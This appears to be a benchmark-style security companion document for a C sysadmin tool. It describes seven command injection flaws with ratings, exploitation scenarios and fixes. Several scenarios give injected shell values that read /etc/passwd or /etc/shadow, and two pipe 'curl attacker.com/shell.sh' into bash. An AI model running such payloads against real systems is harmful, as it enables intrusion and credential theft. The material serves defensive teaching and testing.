# Security Companion Document: main.c

## Vulnerability: Direct Command Injection via system() in Ping

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L26-L28  

### Description
The `ping_host` function constructs a shell command using `snprintf` to embed the user-supplied `host` argument into a string, then passes it to `system()`. The `host` value comes directly from `argv[2]` without any sanitization or validation.

### Exploitation Scenario
An attacker runs `./sysadmin ping "127.0.0.1; cat /etc/passwd"`. The semicolon terminates the `ping` command and executes `cat /etc/passwd`, returning sensitive system file contents. If the binary has elevated privileges (e.g., setuid), this could lead to privilege escalation.

### Remediation Guidance
Use `execvp` or `posix_spawn` with separate arguments to avoid shell interpretation:
```c
void ping_host(const char *host) {
    pid_t pid = fork();
    if (pid == 0) {
        execlp("ping", "ping", "-c", "3", host, NULL);
        _exit(1);
    }
    waitpid(pid, NULL, 0);
}
```
Additionally, validate the `host` parameter against a hostname/IP pattern.

### Complexity Rationale
This is rated Obvious because user input flows directly from `argv` into `snprintf` and then to `system()`, a textbook command injection pattern with no intermediate processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `system()` with user-controlled format string arguments is a well-known dangerous pattern that all major C SAST tools (cppcheck, clang-tidy, Semgrep) flag reliably.

---

## Vulnerability: Command Injection via system() in DNS Lookup

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L46-L48  

### Description
The `dns_lookup` function constructs a shell command using `snprintf` to embed the `domain` argument into a `dig` command string, then passes it to `system()`. Although the `record_type` parameter is validated against an allowlist of valid DNS record types, the `domain` parameter is embedded directly without sanitization.

### Exploitation Scenario
An attacker runs `./sysadmin dns "example.com; id"`. The `domain` value is interpolated into the shell command as `dig A example.com; id +short`, causing the shell to execute both `dig` and `id`.

### Remediation Guidance
Use `execvp` with separate arguments:
```c
execlp("dig", "dig", record_type, domain, "+short", NULL);
```

### Complexity Rationale
This is rated Moderate because the `record_type` parameter is validated against an allowlist, which may create a false sense of security. A reviewer must recognize that the `domain` parameter bypasses this validation.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to track the data flow from `argv` through the `main` function's dispatch logic into `dns_lookup` and recognize that only one of two parameters is validated.

---

## Vulnerability: Multi-Parameter Command Injection in Log Search

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L63-L64  

### Description
The `search_logs` function constructs a shell pipeline command using `snprintf` that embeds three user-controlled parameters: `lines`, `log_path` (derived from `logfile`), and `keyword`. All three are interpolated into a `tail | grep` pipeline and passed to `system()`. The `keyword` is wrapped in single quotes, but this provides no real protection since an attacker can break out of the quotes. The function also performs an `access()` check on the log path, but this does not prevent command injection.

### Exploitation Scenario
An attacker runs `./sysadmin logs "error'; id #" syslog 100`. The single quote breaks out of the grep pattern, the semicolon starts a new command, and `#` comments out the rest. The `lines` parameter can also inject commands: `./sysadmin logs test syslog "100; cat /etc/shadow #"`.

### Remediation Guidance
Avoid shell pipelines. Use `fork`/`exec` with separate commands and pipe output programmatically:
```c
int pipefd[2];
pipe(pipefd);
// Fork for tail, fork for grep, connect via pipe
```

### Complexity Rationale
This is rated Nuanced because three separate user-controlled parameters are injected into a single shell pipeline, the single-quote wrapping creates a false appearance of sanitization, and the `access()` check on the log path may give a false sense of input validation.

### Detection Difficulty Rationale
This is rated Likely_Missed because the multiple injection points within a shell pipeline, combined with the pseudo-sanitization of single quotes and the `access()` check, make this difficult for SAST tools to fully analyze.

---

## Vulnerability: Command Injection via system() in Disk Info

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L69-L71  

### Description
The `disk_info` function constructs a shell command using `snprintf` to embed the user-supplied `path` argument into a `df` command string, then passes it to `system()`. The `path` value comes directly from `argv[2]` without any sanitization.

### Exploitation Scenario
An attacker runs `./sysadmin diskinfo "/; cat /etc/shadow"`. The path value is interpolated into the `df` command, and the shell executes the injected command after `df` completes.

### Remediation Guidance
Use `execvp` with separate arguments:
```c
execlp("df", "df", "-h", path, NULL);
```

### Complexity Rationale
This is rated Obvious because user input flows directly from `argv` into `snprintf` and then to `system()` with no intermediate processing or validation.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `system()` with user-controlled format string arguments is a standard pattern that SAST tools flag reliably.

---

## Vulnerability: Command Injection via system() in Archive

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L90-L92  

### Description
The `archive_path` function constructs a shell command using `snprintf` to embed the `filepath` argument into a `tar` command, then passes it to `system()`. While the `name` parameter undergoes sanitization via `sanitize_archive_name()` (replacing `/` and `\` with `_`), the `filepath` parameter is embedded directly without any validation.

### Exploitation Scenario
An attacker runs `./sysadmin archive "/tmp/data; curl attacker.com/shell.sh | bash" backup`. The `filepath` value is interpolated into the `tar` command, and the shell executes the injected commands.

### Remediation Guidance
Use `execvp` with argument lists:
```c
execlp("tar", "tar", "czf", archive_path, filepath, NULL);
```

### Complexity Rationale
This is rated Moderate because the adjacent `name` parameter has sanitization via `sanitize_archive_name()`, which may create a false sense of security. A reviewer must recognize that `filepath` bypasses the sanitization.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because the presence of the `sanitize_archive_name()` function may cause SAST tools to reduce severity, and tools need to track which parameters are sanitized and which are not.

---

## Vulnerability: Command Injection via system() in Port Check

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L101-L103  

### Description
The `check_port` function constructs a shell command using `snprintf` to embed the `host` and `port` arguments into a `nc` (netcat) command, then passes it to `system()`. While the `port` parameter undergoes integer validation via `atoi()` and range checking, the `host` parameter is embedded directly without sanitization.

### Exploitation Scenario
An attacker runs `./sysadmin netcheck "127.0.0.1; whoami" 80`. The `host` value is interpolated into the `nc` command, and the shell executes both `nc` and `whoami`.

### Remediation Guidance
Use `execvp` with argument lists:
```c
execlp("nc", "nc", "-zv", "-w", "3", host, port, NULL);
```

### Complexity Rationale
This is rated Moderate because the adjacent `port` parameter has integer validation, which may create a false sense of security. However, the `host` parameter is directly embedded without validation.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the taint flow from `argv` to `system()` via `snprintf` is a standard pattern that SAST tools detect reliably.

---

## Vulnerability: Arbitrary Command Execution in Interactive Mode

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L143-L144  

### Description
The `interactive_mode` function reads user input from stdin via `fgets()` and passes it directly to `system()` via `snprintf`. This creates an unrestricted command execution interface where any input is executed as a shell command. While this appears intentional as a "diagnostics mode," it provides no access control, authentication, or command filtering.

### Exploitation Scenario
If the binary is accessible to unauthorized users (e.g., via a web shell, SSH access, or setuid permissions), an attacker can execute arbitrary commands by entering them at the `diag>` prompt. For example, entering `cat /etc/shadow` or `curl attacker.com/shell.sh | bash` would execute without restriction.

### Remediation Guidance
Implement a command allowlist that restricts interactive mode to specific diagnostic commands:
```c
const char *allowed_cmds[] = {"hostname", "uptime", "df", "free", "uname"};
// Validate input against allowlist before execution
```
Or remove the interactive mode entirely if it is not required.

### Complexity Rationale
This is rated Nuanced because the vulnerability appears to be an intentional feature (interactive diagnostics), making it easy to overlook during code review. The `snprintf` copy before `system()` adds an unnecessary indirection that may obscure the direct stdin-to-system() flow.

### Detection Difficulty Rationale
This is rated Likely_Missed because SAST tools may not flag this as a vulnerability since the input comes from stdin rather than a network source. The interactive mode pattern may be considered intentional functionality rather than a security flaw, and the `snprintf` indirection may confuse taint analysis.
